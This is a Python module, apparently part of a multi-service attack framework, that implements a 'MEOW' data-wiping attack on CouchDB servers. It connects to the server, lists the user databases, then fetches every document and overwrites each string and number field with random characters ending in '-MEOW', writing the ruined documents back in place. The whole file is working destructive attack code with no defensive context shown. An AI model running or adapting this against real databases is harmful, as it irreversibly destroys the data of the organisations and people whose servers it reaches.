import random
import string
import requests
from core.base_attacker import BaseAttacker

class CouchDBAttacker(BaseAttacker):
    """
    CouchDB implementation of the BaseAttacker.
    """

    @classmethod
    def get_service_name(cls):
        return "couchdb"

    @classmethod
    def get_default_port(cls):
        return 5984

    def connect(self):
        """
        Connect to CouchDB server.
        """
        self.base_url = f"http://{self.host}:{self.port}"

        # Create session for requests
        self.session = requests.Session()

        # Add authentication if provided
        if self.username and self.password:
            self.session.auth = (self.username, self.password)

        try:
            # Test connection
            response = self.session.get(f"{self.base_url}/")
            if response.status_code != 200:
                raise Exception(f"Failed to connect: HTTP {response.status_code}")

            self.logger.info("Successfully connected to CouchDB")
            return self.session
        except Exception as e:
            self.logger.error(f"Failed to connect to CouchDB: {str(e)}")
            raise

    def get_databases(self):
        """
        Get list of databases, excluding system databases.
        """
        response = self.session.get(f"{self.base_url}/_all_dbs")
        if response.status_code != 200:
            raise Exception(f"Failed to get databases: HTTP {response.status_code}")

        databases = response.json()
        # Filter out system databases (starting with _)
        return [db for db in databases if not db.startswith('_')]

    def get_collections(self, database):
        """
        In CouchDB, there's no concept of collections within a database.
        We return the database name itself as the "collection".
        """
        return [database]

    def random_alphanumeric(self, length=10):
        """
        Generate a random alphanumeric string.
        """
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

    def meow_data(self, database, collection):
        """
        Execute the MEOW attack on the specified database.
        """
        # Get all documents in the database
        response = self.session.get(f"{self.base_url}/{database}/_all_docs?include_docs=true")
        if response.status_code != 200:
            raise Exception(f"Failed to get documents: HTTP {response.status_code}")

        results = response.json()
        rows = results.get('rows', [])
        modified_count = 0

        for row in rows:
            doc = row.get('doc', {})
            doc_id = doc.get('_id')
            doc_rev = doc.get('_rev')

            if not doc_id or not doc_rev:
                continue

            # Skip design documents
            if doc_id.startswith('_design/'):
                continue

            # Update document fields (preserve _id and _rev)
            updated_doc = {
                '_id': doc_id,
                '_rev': doc_rev
            }

            for key, value in doc.items():
                if key in ('_id', '_rev'):
                    continue

                if isinstance(value, (str, int, float)):
                    random_chars = self.random_alphanumeric()
                    updated_doc[key] = f"{random_chars}-MEOW"
                else:
                    updated_doc[key] = value

            # Update the document
            update_response = self.session.put(
                f"{self.base_url}/{database}/{doc_id}",
                json=updated_doc
            )

            if update_response.status_code in (200, 201):
                modified_count += 1
            else:
                self.logger.warning(f"Failed to update document {doc_id}: HTTP {update_response.status_code}")

        self.logger.info(f"Modified {modified_count} documents in {database}")
        return modified_count

    def close(self):
        """
        Close the CouchDB session.
        """
        if hasattr(self, 'session'):
            self.session.close()
            self.logger.info("CouchDB session closed")
